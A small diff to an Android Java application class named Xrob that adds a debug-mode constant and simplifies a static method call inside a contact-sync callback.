@@ -48,6 +48,9 @@ import org.acra.sender.HttpSender;
 )
 public class Xrob extends Application {
 
+
+    public static final boolean IS_DEBUG_MODE = false;
+
     public static final String KEY_ERROR = "error";
     public static final String KEY_MESSAGE = "message";
     public static final String KEY_DATA = "data";
@@ -107,7 +110,7 @@ public class Xrob extends Application {
             @Override
             public void onReadyToRequest(String apiKey) {
                 Log.d(X, "Starting contact sync... 2");
-                Xrob.doMainTasks(Xrob.this, apiKey);
+                doMainTasks(Xrob.this, apiKey);
             }
 
             @Override
